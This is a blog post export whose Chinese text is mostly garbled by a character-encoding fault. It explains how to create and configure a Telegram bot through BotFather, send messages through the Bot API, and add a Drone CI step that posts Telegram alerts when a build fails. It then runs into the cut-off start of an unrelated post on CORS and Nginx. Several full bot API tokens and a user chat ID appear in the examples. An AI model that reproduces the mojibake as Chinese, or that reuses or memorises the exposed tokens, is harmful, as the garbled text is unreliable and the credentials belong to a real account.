å…¥ç¾¤çµ„ /setprivacy è¨­å®šæ˜¯å¦èƒ½è®€å–æ‰€æœ‰èŠå¤©å®¤è¨Šæ¯ï¼ˆæ©Ÿå™¨äººçš„è¨Šæ¯é™¤å¤–ï¼Œæ©Ÿå™¨äººä¸è«–å¦‚ä½•éƒ½ä¸æœƒçœ‹åˆ°æ©Ÿå™¨äººçš„è¨Šæ¯ï¼‰ å»ºç«‹ä½ çš„æ©Ÿå™¨äººå§ è¼¸å…¥ /newbot æŒ‡ä»¤ å¹«æ©Ÿå™¨äººå–åå­— 1 Alright, a new bot. How are we going to call it? Please choose a name for your bot. é€™é‚Šå®ƒæœƒè¦ä½ å¹«ä½ çš„æ©Ÿå™¨äººå–ä¸€å€‹åå­—ï¼Œé€™å€‹ä»¥å¾Œèƒ½ä¿®æ”¹ï¼Œæ‰€ä»¥éš¨ä¾¿å–æ²’å·®\nè¨­å®š username 1 Good. Now let\u0026#39;s choose a username for your bot. It must end in `bot`. Like this, for example: TetrisBot or tetris_bot. âš ï¸ æ³¨æ„ï¼šè¨­å®šå¾Œå°±ä¸èƒ½ä¿®æ”¹äº†ï¼Œè«‹è¬¹æ…æ€è€ƒä¹‹å¾Œè¨­å®šï¼Œé¿å…åæ‚”æ™‚éœ€è¦è«‹ä½¿ç”¨è€…é·ç§»\néœ€è¦å¹«ä½ çš„æ©Ÿå™¨äººè¨­å®šä¸€å€‹ usernameï¼Œå¿…é ˆç¬¦åˆä»¥ä¸‹è¦å‰‡ï¼š\nä¸éœ€è¦æ‰“ @ ä»¥ a~z é–‹é ­ ä»¥ bot çµå°¾ åªèƒ½ä½¿ç”¨ a~zã€0~9 å’Œåº•ç·š æœ€å°é•·åº¦ç‚º 5 å€‹å­—å…ƒ é¡¯ç¤ºæ™‚æœƒå€åˆ†å¤§å°å¯«ï¼Œä½¿ç”¨æ™‚ä¸å€åˆ†å¤§å°å¯«ï¼ˆä¾‹å¦‚è¨­å®šæˆ @TetrisBotï¼Œç”¨ @tETrISbOt ä¸€æ¨£æœƒæŒ‡åˆ°åŒä¸€å€‹æ©Ÿå™¨äººï¼‰\nå¸¸è¦‹å•é¡Œï¼š\nä¸èƒ½ä»¥æ•¸å­—é–‹é ­ 1 Sorry, this username is invalid. ä¸èƒ½ç”¨ bot ä»¥å¤–çš„å­—çµå°¾ 1 Sorry, the username must end in \u0026#39;bot\u0026#39;. E.g. \u0026#39;Tetris_bot\u0026#39; or \u0026#39;Tetrisbot\u0026#39; username å·²ç¶“è¢«åˆ¥äººå…ˆç”¨èµ°äº† 1 Sorry, this username is already taken. Please try something different. å‡ºç¾ Done è¡¨ç¤ºä½ è¨­å®šæˆåŠŸäº†\nä½¿ç”¨ä½ çš„æ©Ÿå™¨äººå§ ç¾åœ¨ä½ å·²ç¶“å¯ä»¥ä½¿ç”¨æ©Ÿå™¨äººäº†\næŒ‰ä¸‹èªªæ˜è£¡çš„é€£çµ(t.me/ironman2021_by_miku3920_bot é»ä½ è‡ªå·±çš„)ï¼Œä¸¦ä¸”é»æ“Šã€Œé–‹å§‹ã€\nç„¶å¾Œä½ å°±æœƒç™¼ç¾ä»€éº¼äº‹æƒ…éƒ½æ²’ç™¼ç”Ÿï¼Œå› ç‚ºæˆ‘å€‘é‚„æ²’å¯«æ©Ÿå™¨äººçš„ç¨‹å¼å˜›\nä¸éå°±ç®—ä¸å¯«ç¨‹å¼ä¹Ÿå¯ä»¥è®“å®ƒèªªè©±ï¼Œåˆ©ç”¨ HTTP GET æ–¹æ³•ï¼Œèˆ‡ sendMessage é€™å€‹ API\n1 https://api.telegram.org/bot{Token}/{Method}?{Parameter1}={Value1}\u0026amp;{Parameter2}={Value2} Tokenï¼š1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4ï¼ˆä½ çš„ bot tokenï¼‰ Methodï¼šsendMessage Parameter1ï¼šchat_id Value1ï¼š127355800ï¼ˆä½ çš„ uidï¼Œå¯ä»¥é€é @userinfobot å–å¾—ï¼‰ Parameter2ï¼štext Value2ï¼šHello,+World!+ä½ å¥½ï¼Œä¸–ç•Œï¼ï¼ˆç©ºç™½è¦ç”¨ã€Œ+ã€æ›¿æ›ï¼‰ çµ„åˆå®Œæœƒåƒé€™å€‹æ¨£å­ï¼Œç›´æ¥è²¼åˆ°ç€è¦½å™¨çš„ç¶²å€åˆ—å°±èƒ½ä½¿ç”¨å›‰ï¼š\n1 https://api.telegram.org/bot1985044907:AAEdySrbzTc8tVdBjfymlfyaBUJGeu7r-v4/sendMessage?chat_id=127355800\u0026amp;text=Hello,+World!+ä½ å¥½ï¼Œä¸–ç•Œï¼ PSï¼šèŠå¤©å®¤çš„ chat_idï¼Œå…ˆå°‡ä½ çš„æ©Ÿå™¨äººé‚€è«‹é€²å…¥èŠå¤©å®¤ï¼Œå†ä½¿ç”¨æ­¤ç¶²å€å–å¾—ï¼šhttps://api.telegram.org/bot${your_bot_token}/getUpdates\nå¸¸è¦‹å•é¡Œï¼š\nToken æ‰“éŒ¯ 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:401,\u0026#34;description\u0026#34;:\u0026#34;Unauthorized\u0026#34;} Method æ‰“éŒ¯ 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:404,\u0026#34;description\u0026#34;:\u0026#34;Not Found\u0026#34;} chat_id çš„å€¼ä¸èƒ½ç‚ºç©º 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat_id is empty\u0026#34;} chat_id çš„å€¼æ‰“éŒ¯ 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: chat not found\u0026#34;} æ²’ç§è¨Šéæ©Ÿå™¨äºº 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:403,\u0026#34;description\u0026#34;:\u0026#34;Forbidden: bot can\u0026#39;t initiate conversation with a user\u0026#34;} text çš„å€¼ä¸èƒ½ç‚ºç©º 1 {\u0026#34;ok\u0026#34;:false,\u0026#34;error_code\u0026#34;:400,\u0026#34;description\u0026#34;:\u0026#34;Bad Request: message text is empty\u0026#34;} æˆåŠŸçš„è©±æœƒè¿”å›æ©Ÿå™¨äººç™¼é€çš„è¨Šæ¯ï¼ˆjson æ ¼å¼ï¼‰åˆ°ç¶²é ä¸Šï¼š\n1 {\u0026#34;ok\u0026#34;:true,\u0026#34;result\u0026#34;:{\u0026#34;message_id\u0026#34;:5,\u0026#34;from\u0026#34;:{\u0026#34;id\u0026#34;:1985044907,\u0026#34;is_bot\u0026#34;:true,\u0026#34;first_name\u0026#34;:\u0026#34;2021 iThome\\u9435\\u4eba\\u8cfd\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;ironman2021_by_miku3920_bot\u0026#34;},\u0026#34;chat\u0026#34;:{\u0026#34;id\u0026#34;:127355800,\u0026#34;first_name\u0026#34;:\u0026#34;\\u521d\\u97f3\u0026#34;,\u0026#34;last_name\u0026#34;:\u0026#34;\\u30df\\u30af\u0026#34;,\u0026#34;username\u0026#34;:\u0026#34;miku3920\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;private\u0026#34;},\u0026#34;date\u0026#34;:1631440402,\u0026#34;text\u0026#34;:\u0026#34;Hello, World! \\u4f60\\u597d\\uff0c\\u4e16\\u754c\\uff01\u0026#34;}} Telegram æ©Ÿå™¨äººçš„è¨­å®š è¼¸å…¥ /mybots æŒ‡ä»¤å¾Œå°±æœƒå‡ºç¾æ©Ÿå™¨äººåˆ—è¡¨\n1 Choose a bot from the list below: é¸æ“‡ä¸€å€‹ä½ è¦æŸ¥çœ‹æˆ–è¨­å®šçš„æ©Ÿå™¨äºº\næˆ‘ä¹‹å‰å°±æœ‰å»ºç«‹éæ©Ÿå™¨äººï¼Œæ‰€ä»¥æœƒé¡¯ç¤ºå…©å€‹\n1 2 Here it is: 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. What do you want to do with the bot? é»ä¸‹å»å¾Œå°±æœƒå‡ºç¾å…­å€‹é¸é …ï¼Œæˆ‘ä¸€å€‹å€‹ä¾†è¬›è§£ï¼š\nAPI Token - æŸ¥çœ‹ token 1 2 3 Here is the token for bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot: 1985044907:AAH1kZaEZFHoA6YqB6IFtvbkyOjvcpPOfbQ å¿˜è¨˜ token æ™‚å¯ä»¥ä¾†é€™è£¡æŸ¥çœ‹ï¼Œæˆ–æ˜¯ä½ æƒ³è¦é‡ç½® token\nRevoke current token - é‡ç½® token 1 2 3 Token for the bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot has been revoked. New token is: 1985044907:AAG3E05XowN2sqy286aplwr6oBc17q0CByg æŒ‰ä¸‹é‡ç½®æŒ‰éˆ•å¾Œï¼Œå®ƒå°±æœƒçµ¦ä½ ä¸€å€‹æ–°çš„ tokenï¼ŒèˆŠçš„æœƒç«‹å³å¤±æ•ˆ\nEdit Bot - ä¿®æ”¹æ©Ÿå™¨äºº 1 2 3 4 5 6 7 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThomeéµäººè³½ Description: ? About: ? Botpic: ? no botpic Commands: no commands yet Edit Name - ä¿®æ”¹åå­— æŒ‰ä¸‹æŒ‰éˆ•å¾Œæœƒå‡ºç¾ä»¥ä¸‹è¨Šæ¯\n1 OK. Send me the new name for your bot. ç›´æ¥å‚³é€æ–°çš„åç¨±çµ¦å®ƒå°±è¡Œäº†\n1 Success! Name updated. /help çœ‹åˆ°é€™å€‹å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\nEdit Description - ä¿®æ”¹èªªæ˜ é€™å€‹æœƒé¡¯ç¤ºåœ¨èŠå¤©å®¤çš„æœ€ä¸Šæ–¹ï¼Œç”¨ä¾†èªªæ˜æ©Ÿå™¨äººæœ‰èƒ½äº›åŠŸèƒ½ï¼Œæˆ–æ˜¯å¦‚ä½•ä½¿ç”¨\n1 OK. Send me the new description for the bot. People will see this description when they open a chat with your bot, in a block titled \u0026#39;What can this bot do?\u0026#39;. å‚³é€ä¸€æ®µè¨Šæ¯çµ¦å®ƒï¼Œå¯ä»¥æ˜¯å¤šè¡Œçš„æ–‡å­—\n1 Success! Description updated. /help çœ‹åˆ°é€™å€‹å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\nåŸæœ¬åœ¨èŠå¤©å®¤ä¸Šæ–¹å•¥éƒ½æ²’æœ‰ï¼Œç¾åœ¨å¤šäº†ä¸€å€‹è¨Šæ¯æ¡†\nEdit About - ä¿®æ”¹ç°¡ä»‹ é€™å€‹æœƒé¡¯ç¤ºåœ¨æ©Ÿå™¨äººçš„å€‹äººè³‡è¨Šé é¢ä¸Š\n1 OK. Send me the new \u0026#39;About\u0026#39; text. People will see this text on the bot\u0026#39;s profile page and it will be sent together with a link to your bot when they share it with someone. å‚³é€ä¸€æ®µè¨Šæ¯çµ¦å®ƒï¼Œå¯ä»¥æ˜¯å¤šè¡Œçš„æ–‡å­—\n1 Success! About section updated. /help çœ‹åˆ°é€™å€‹å°±æ˜¯ä¿®æ”¹æˆåŠŸäº†\nåŸæœ¬æ˜¯åªæœ‰é¡¯ç¤º usernameï¼Œç¾åœ¨å¤šäº† ç°¡ä»‹\nEdit Botpic - ä¿®æ”¹å¤§é ­è²¼ 1 OK. Send me the new profile photo for the bot. å»ºè­°å…ˆè£åˆ‡æˆæ­£æ–¹å½¢ï¼ˆ1ï¼š1ï¼‰\n1 Please send me the picture as a \u0026#39;Photo\u0026#39;, not as a \u0026#39;File\u0026#39;. é€™é‚Šè¦å‚³é€ç…§ç‰‡ï¼Œä¸èƒ½å‚³æª”æ¡ˆ\n1 Success! Profile photo updated. /help æˆåŠŸçš„è©±ï¼Œæ©Ÿå™¨äººçš„å¤§é ­è²¼å°±æœƒæ›´æ–°æˆå‰›å‰›ä¸Šå‚³çš„åœ–ç‰‡\nEdit Commands - ä¿®æ”¹æŒ‡ä»¤é¸å–® 1 2 3 4 5 6 OK. Send me a list of commands for your bot. Please use this format: command1 - Description command2 - Another description Send /empty to keep the list empty. è¦æŒ‰ç…§å®ƒçµ¦çš„æ ¼å¼è¼¸å…¥ï¼Œä¸éœ€è¦æ‰“ /\n1 Success! Command list updated. /help æˆåŠŸçš„è©±ï¼Œé¸å–®ä¸­å°±æœƒå‡ºç¾å‰›å‰›è¨­å®šçš„æŒ‡ä»¤\nå¦‚æœæ©Ÿå™¨äººæ˜¯åœ¨ç¾¤çµ„ä½¿ç”¨ï¼Œå»ºè­°æ”¹æˆç©ºçš„ï¼Œé¿å…èª¤è§¸\nç¾¤çµ„è£¡è¼ƒå¸¸ä½¿ç”¨ ! é–‹é ­çš„æŒ‡ä»¤ï¼Œé€™æ¨£æ‰ä¸æœƒè®Šæˆè—è—çš„å®¹æ˜“æŒ‰åˆ°\nåœ¨å‰›å‰›é‚£é‚Šï¼ŒæŒ‰ /empty å°±è¡Œäº†\nä¿®æ”¹å®Œæœƒè®Šæˆé€™æ¨£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 Edit @ironman2021_by_miku3920_bot info. Name: 2021 iThomeéµäººè³½ Description: ä¸€äº›èªªæ˜æ–‡å­—ï¼ŒåŠŸèƒ½å¦‚ä¸‹ï¼š 1. AAA 2. BBB 3. CCC About: éµäººè³½å±•ç¤ºç”¨æ©Ÿå™¨äºº by @miku3920 éµäººè³½å±•ç¤ºç”¨æ©Ÿå™¨äºº by @miku3920 éµäººè³½å±•ç¤ºç”¨æ©Ÿå™¨äºº by @miku3920 Botpic: ? has a botpic Commands: no commands yet Bot Settings - è¨­å®šæ©Ÿå™¨äºº 1 Settings for @ironman2021_by_miku3920_bot. Inline Mode - å…§è¯æ¨¡å¼ï¼ˆå…§åµŒæ¨¡å¼ï¼‰ å¯ä»¥è®“æ©Ÿå™¨äººç›´æ¥åœ¨è¨Šæ¯è¼¸å…¥æ¡†ä½¿ç”¨ï¼Œä¸éœ€è¦å°‡æ©Ÿå™¨äººåŠ å…¥ç¾¤çµ„\né€™å€‹åŠŸèƒ½å¤ è¬›ä¸€æ•´å¤©äº†ï¼Œç›®å‰é‚„ç”¨ä¸åˆ°ï¼Œæˆ‘å€‘ä»¥å¾Œå°ˆé–€æ‰¾ä¸€å¤©ä¾†è¬›\nAllow Group? - æ˜¯å¦èƒ½è¢«åŠ å…¥ç¾¤çµ„? 1 2 3 Groups are currently enabled for bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot Disabling groups will forbid users to add 2021 iThomeéµäººè³½ to groups. enabled(é è¨­) - è¡¨ç¤ºæ©Ÿå™¨äººèƒ½è¢«åˆ¥äººæ‹‰é€²ç¾¤çµ„\nå¦‚æœä½ ä¸æƒ³è®“åˆ¥äººæ‹‰ä½ çš„æ©Ÿå™¨äººï¼Œå¯ä»¥æŒ‰ Turn groups off\n1 2 3 Groups are currently disabled for bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. Enabling groups will allow users to add 2021 iThomeéµäººè³½ to groups. disabled - è¡¨ç¤ºæ©Ÿå™¨äººä¸èƒ½è¢«åˆ¥äººæ‹‰é€²ç¾¤çµ„\nå¦‚æœä½ æƒ³è®“åˆ¥äººçš„ç¾¤çµ„ä¹Ÿèƒ½ä½¿ç”¨ä½ çš„æ©Ÿå™¨äººï¼Œå°±æŒ‰ Turn groups on\nGroup Privacy - æ˜¯å¦èƒ½è®€å–æ‰€æœ‰èŠå¤©å®¤è¨Šæ¯ å®˜æ–¹èªªæ˜\n1 Privacy mode is enabled for 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. enabled(é è¨­) - è¡¨ç¤ºæ©Ÿå™¨äººæ˜¯æˆå“¡æ™‚ä¸èƒ½è®€å–ç¾¤çµ„è£¡çš„æ‰€æœ‰è¨Šæ¯\næ©Ÿå™¨äººåªçœ‹çš„åˆ°å®ƒçš„æŒ‡ä»¤å’Œå›è¦†å®ƒçš„è¨Šæ¯\nä½†æ˜¯å¦‚æœå‡ç´šæˆç®¡ç†å“¡å°±æ²’é€™é™åˆ¶\n1 Privacy mode is disabled for 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. disabled - è¡¨ç¤ºæ©Ÿå™¨äººå°±ç®—ä¸æ˜¯ç®¡ç†å“¡ä¹Ÿèƒ½è®€å–ç¾¤çµ„è£¡çš„æ‰€æœ‰è¨Šæ¯\næ©Ÿå™¨äººæ˜¯æˆå“¡æ™‚å°±èƒ½è®€å–æ‰€æœ‰è¨Šæ¯\nPayments - ä»˜æ¬¾ç›¸é—œè¨­å®š å°ç£ä¸èƒ½ç”¨ï¼Œæœ‰ç”Ÿä¹‹å¹´ç³»åˆ—ï¼Œè·³é\nDomain - ç¶²ç«™ç™»å…¥ç”¨ èˆ‡æ©Ÿå™¨äººè¼ƒç„¡é—œï¼Œæš«æ™‚ä¸æ\nPayments - ä»˜æ¬¾ç›¸é—œè¨­å®š æ­ä»˜å¯¶ã€ç¶ ç•Œã€å°ç£ payã€è¡—å£ã€æ‚ éŠä»˜ï¼Œä¸è€ƒæ…®é€²é§ä¸€ä¸‹å—\nTransfer Ownership - è½‰ç§»æ©Ÿå™¨äºº âš ï¸ æ³¨æ„ï¼šéå¿…è¦è«‹å‹¿ä½¿ç”¨ï¼\nChoose recipient - é¸æ“‡ä½¿ç”¨è€… 1 Please share the new owner\u0026#39;s contact or their username. æŒ‰ä¸‹æŒ‰éˆ•å¾Œï¼Œå®ƒæœƒè«‹ä½ æŠŠå°æ–¹ä»¥è¯çµ¡äººçš„æ–¹å¼åˆ†äº«çµ¦å®ƒï¼Œæˆ–æ˜¯è¼¸å…¥å°æ–¹çš„ username\nå¸¸è¦‹å•é¡Œï¼š\nè¦è¼¸å…¥ @usernameï¼Œä¸èƒ½åªè¼¸å…¥ username 1 Incorrect format. Please make sure to send either a contact or username. ä¸èƒ½è½‰ç§»çµ¦é »é“ã€æ©Ÿå™¨äººã€æˆ–æ˜¯è‡ªå·± 1 Bot ownership can\u0026#39;t be transferred to channel, another bot or yourself. å°æ–¹è¦ç§è¨Šéæ©Ÿå™¨äººï¼Œè€Œä¸”ä¸èƒ½å°é–æ©Ÿå™¨äºº 1 Oops! Please make sure the new owner has sent at least one message to the bot and didn\u0026#39;t block it. è¼¸å…¥æ­£ç¢ºçš„è©±ï¼Œå°±æœƒå‡ºç¾ä»¥ä¸‹è¨Šæ¯ï¼š\n1 2 3 4 5 You are about to transfer ownership of the bot @ironman2021_by_miku3920_bot to åˆéŸ³ ãƒŸã‚¯. After this you won\u0026#39;t be able to control the bot anymore. The new owner will get access to the bot messages and other data â€“ and can even delete the bot completely. Please make sure you don\u0026#39;t violate your users\u0026#39; privacy (consider GDPR and other laws). If you are sure please press the button below. çœ‹åˆ°é€™å‰‡è¨Šæ¯ä»£è¡¨é›¢æˆåŠŸè½‰ç§»ä¸é äº†\nYes, I am sure, proceed. - ç¢ºèªè½‰ç§» å¦‚æœä½ æœ‰è¨­å®šå…©æ­¥é©Ÿé©—è­‰çš„è©±ï¼Œé€™é‚Šæœƒè·³å‡ºä¾†è¦ä½ è¼¸å…¥\nå¸¸è¦‹å•é¡Œï¼š\nå°æ–¹æ“æœ‰çš„æ©Ÿå™¨äººæ•¸é‡å·²é”ä¸Šé™ 1 Oops! has reached the maximum allowed number of bots. Please ask them to delete (or pass to another account) one of their unused bots first. å¦‚æœå°æ–¹å·²ç¶“æœ‰ 20 éš»æ©Ÿå™¨äººï¼ˆé”åˆ°ä¸Šé™ï¼‰ï¼Œå°±æœƒå‡ºç¾é€™å€‹å°è©±æ¡†ï¼Œä»–è«‹ä½ å…ˆå«å°æ–¹è½‰ç§»æˆ–åˆªé™¤ä¸€äº›æ²’åœ¨ç”¨çš„æ©Ÿå™¨äººï¼Œé€™æ¨£ä½ æ‰å¯ä»¥è½‰ç§»çµ¦å°æ–¹ã€‚\n1 It worked! We hope @ironman2021_by_miku3920_bot will enjoy its new home. å¦‚æœè½‰ç§»æˆåŠŸå°±æœƒå‡ºç¾é€™å‰‡è¨Šæ¯\n1 2 3 Ownership of the bot @ironman2021_by_miku3920_bot has been transferred to you by åˆéŸ³ ãƒŸã‚¯. You can now control the bot using /mybots. If you did not request this, you can delete the bot. Delete Bot - åˆªé™¤æ©Ÿå™¨äºº âš ï¸ æ³¨æ„ï¼šéå¿…è¦è«‹å‹¿ä½¿ç”¨ï¼\n1 You are about to delete your bot 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. Is that correct? é€™é‚Šçš„æŒ‰éˆ•é †åºæ˜¯éš¨æ©Ÿçš„ï¼Œé¿å…ä½ é ­è…¦ä¸æ¸…æ¥šæŠŠæ©Ÿå™¨äººåˆªäº†\n1 Are you TOTALLY sure you want to delete 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot ? è¦é€£çºŒæŒ‰å…©æ¬¡ Yes æ©Ÿå™¨äººæ‰æœƒè¢«åˆªæ‰\n1 You have deleted 2021 iThomeéµäººè³½ @ironman2021_by_miku3920_bot. çœ‹åˆ°é€™å‰‡è¨Šæ¯è¡¨ç¤ºæ©Ÿå™¨äººå·²ç¶“åˆªé™¤ï¼Œç„¡æ³•å¾©åŸ\næ‰€æœ‰ç¾¤çµ„è£¡çš„é€™éš»æ©Ÿå™¨äººéƒ½æœƒé¡¯ç¤ºæˆ Deleted Account\nBonusï¼šDrone CI/CD æµç¨‹å¤±æ•—æ™‚ï¼Œå«ä½ çš„ Telegram æ©Ÿå™¨äººé€šçŸ¥ä½ ï¼ å»ºç«‹ç¾¤çµ„ï¼Œä¸¦å–å¾—ç¾¤çµ„çš„ chat_id Telegram å»ºç«‹ç¾¤çµ„ï¼Œä¸¦å°‡ä½ çš„ Telegram æ©Ÿå™¨äººæ‹‰é€²ç¾¤çµ„å…§(@{your bot username})ã€‚ é€éæ­¤ API å–å¾—ç¾¤çµ„çš„ chat_idï¼š 1 https://api.telegram.org/bot${your bot token}/getUpdates getUpdates API æœƒå–å¾— jsonï¼Œæ‰¾åˆ°ä½ å‰›å‰›é–‹çš„ç¾¤çµ„çš„ chat_id\né€é Drone Plugin å¾ Drone Plugin å¯ä»¥æ‰¾åˆ°å¾ˆå¤šå¥—ä»¶ï¼Œå¯ä»¥æ­é… CI/CD ä½¿ç”¨ï¼Œè€Œæˆ‘å¾é€™æ‰¾åˆ° Telegram by appleboy çš„å¥—ä»¶ã€‚\nDrone CI/CD è£œä¸Šå‘Šè­¦çš„ stepã€‚ ä½ çš„ Drone CI/CD step åŠ ä¸Šä½¿ç”¨ Telegram by appleboy å«ä½ çš„æ©Ÿå™¨äººæ–¼ pipeline å¤±æ•—æ™‚æ–¼ç¾¤çµ„å…§ç™¼å‡ºå‘Šè­¦ã€‚\nPSï¼šè¨˜å¾—å°‡ä½ çš„ telegram bot token èˆ‡ç¾¤çµ„çš„ chat_id åŠ åˆ° Drone Secretsã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 kind: pipeline type: docker name: install and deploy steps: - name: build image: node:15 commands: - node --version - yarn --version # - yarn cache clean -f - yarn install --ignore-engines - yarn run build - ls -al dist/static/ when: branch: - master event: - push - name: deploy image: thegeeklab/drone-s3-sync settings: bucket: xxxxxxxxx(ä½ çš„aws s3 bucket) access_key: from_secret: aws_access_key_id secret_key: from_secret: aws_secret_access_key source: ./dist/ target: /admin acl: \u0026#34;*\u0026#34;: public-read region: xxxxxxxxx(ä½ çš„aws s3 region) delete: true cloudfront_distribution: xxxxxxxxx(ä½ çš„aws cloudfront distribution) when: branch: - master event: - push + - name: send telegram notification + image: appleboy/drone-telegram + settings: + token: + from_secret: telegram_bot_token + to: + from_secret: telegram_chat_id + format: markdown + message: \u0026gt; + `{{repo.name}}` æ–¼ `{{commit.branch}}` ç·¨è­¯å¤±æ•—ï¼š#`{{build.number}}` + when: + status: [failure] tokenï¼š ä½ çš„ Telegram æ©Ÿå™¨äººçš„ tokenã€‚ toï¼š chat_idã€‚ formatï¼š ä½¿ç”¨ markdown æ ¼å¼ã€‚ messageï¼š æ©Ÿå™¨äººå‚³çš„è¨Šæ¯ã€‚ when.status [failure]ï¼š ç•¶æ­¤ pipeline å¤±æ•—æ™‚è§¸ç™¼æ­¤ step(send telegram notification)ï¼Œäº¦å¯æ–¼æˆåŠŸæˆ–å¤±æ•—çš†å‘Šè­¦ï¼š[success, failure]ã€‚ è©³ç´°åƒæ•¸å¯åƒè€ƒ Drone Plugin - appleboy/drone-telegram\n","date":"2022-08-25T00:00:00Z","image":"https://live.staticflickr.com/65535/52309739568_a0d98a6137_o.png","permalink":"https://wayneblog.ga/2022-08-25/drone-cicd-with-telegram-bot/","title":"Telegram æ©Ÿå™¨äººèªªæ˜ï¼Œä¸¦ç‚ºä½ çš„ Drone CI/CD é…ç½® Telegram æ©Ÿå™¨äºº"},{"content":" åƒè€ƒæ–‡ç«  CORSè·¨åŸŸèˆ‡Nginxåå‘ä»£ç† CORS on Nginx Nginxè§£å†³CORSè·¨åŸŸè§£å†³æ–¹æ¡ˆ åœ¨ Nginx çš„ ProxyPass Upstream è¨­å®š CORS ï¼ˆè·¨ä¾†æºè³‡æºå…±äº«ï¼‰ CORSè·¨åŸŸ è·¨åŸŸè³‡æºå…±äº« - CORS è·¨åŸŸè³‡æºå…±äº«(CORS)æ˜¯ä¸€ç¨®æ©Ÿåˆ¶ï¼Œå®ƒä½¿ç”¨é¡å¤–çš„ HTTP é ­ä¾†å‘Šè¨´ç€è¦½å™¨ï¼Œè®“é‹è¡Œåœ¨ä¸€å€‹ origin (domain) ä¸Šçš„Webæ‡‰ç”¨è¢«å‡†è¨±è¨ªå•ä¾†è‡ªä¸åŒæºæœå‹™å™¨ä¸Šçš„æŒ‡å®šçš„è³‡æºã€‚ç•¶ä¸€å€‹è³‡æºå¾èˆ‡è©²è³‡æºæœ¬èº«æ‰€åœ¨çš„æœå‹™å™¨ä¸åŒçš„åŸŸã€å”è­°æˆ–ç«¯å£è«‹æ±‚ä¸€å€‹è³‡æºæ™‚ï¼Œè³‡æºæœƒç™¼èµ·ä¸€å€‹è·¨åŸŸ HTTP è«‹æ±‚ã€‚\næ¯”å¦‚ï¼Œç«™é» http://domain-a.com çš„æŸ HTML é é¢é€šé \u0026lt;img\u0026gt; çš„ src è«‹æ±‚ http://domain-b.com/image.jpgã€‚ç¶²çµ¡ä¸Šçš„è¨±å¤šé é¢éƒ½æœƒåŠ è¼‰ä¾†è‡ªä¸åŒåŸŸçš„CSSæ¨£å¼è¡¨ï¼Œåœ–åƒå’Œè…³æœ¬ç­‰è³‡æºã€‚\nå‡ºæ–¼å®‰å…¨åŸå› ï¼Œç€è¦½å™¨é™åˆ¶å¾è…³æœ¬å…§ç™¼èµ·çš„è·¨æºHTTPè«‹æ±‚ã€‚ä¾‹å¦‚ï¼ŒXMLHttpRequestå’ŒFetch APIéµå¾ªåŒæºç­–ç•¥ã€‚é€™æ„å‘³è‘—ä½¿ç”¨é€™äº›APIçš„Webæ‡‰ç”¨ç¨‹åºåªèƒ½å¾åŠ è¼‰æ‡‰ç”¨ç¨‹åºçš„åŒä¸€å€‹åŸŸè«‹æ±‚HTTPè³‡æºï¼Œé™¤ééŸ¿æ‡‰å ±æ–‡åŒ…å«äº†æ­£ç¢ºCORSéŸ¿æ‡‰é ­ã€‚\nè·¨åŸŸæ™‚éƒ¨åˆ†ç€è¦½å™¨é è¨­ä¸æ”œå¸¶cookieï¼Œå› æ­¤ç‚ºäº†æ”œå¸¶cookieéœ€è¦åœ¨å‰ç«¯è¨­å®šxmlhttprequestçš„withCrendetallså±¬æ€§ã€‚ ã€ŒåŒæºã€å®šç¾© ã€ŒåŒæºã€å®šç¾©å¾ˆç°¡å–®ï¼Œä»¥ä¸‹ä¸‰å€‹åƒæ•¸éƒ½ç›¸åŒï¼š\n1 [protocol]://[domain]:[port] ç™½è©±èªªï¼Œç•¶ä½ åœ¨ https://www.example.com/product.html é é¢\nå˜—è©¦å°ä»¥ä¸‹è·¯å¾‘ç™¼å‡ºè«‹æ±‚ï¼Œéƒ½é•ååŒæºï¼š\nhttp://www.example.com/api/products/40.json https://www.example2.com/api/products/40.json https://www.example.com:8080/api/products/40.json ä¹–å­©å­éµå®ˆåŒæºï¼Œä¸æœƒè¢«æ‰“ï¼š\nhttps://www.example.com/api/products/40.json ç°¡å–®è«‹æ±‚å’Œè¤‡é›œè«‹æ±‚ ç°¡å–®è«‹æ±‚èˆ‡è¤‡é›œè«‹æ±‚çš„å·®åˆ¥æ˜¯è¤‡é›œè«‹æ±‚æœƒè‡ªå‹•ç™¼å‡ºä¸€å€‹ OPTIONS çš„é æª¢è«‹æ±‚ï¼Œç•¶è«‹æ±‚å¾—åˆ°ç¢ºèªå¾Œï¼Œæ‰é–‹å§‹çœŸæ­£ç™¼é€è«‹æ±‚ã€‚\nç¶œä¸Šï¼Œæˆ‘å€‘è¦è§£æ±ºå…©å€‹å•é¡Œï¼š\nOPTIONS è«‹æ±‚çš„æ­£ç¢ºéŸ¿æ‡‰ è·¨åŸŸè«‹æ±‚æ­£ç¢ºéŸ¿æ‡‰ OPTIONS è«‹æ±‚çš„æ­£ç¢ºéŸ¿æ‡‰ åƒè€ƒç¶²å€\nè§£æ±ºçš„æ–¹å¼æœ‰å¤šç¨®ï¼Œæ—¢å¯ä»¥åœ¨Web 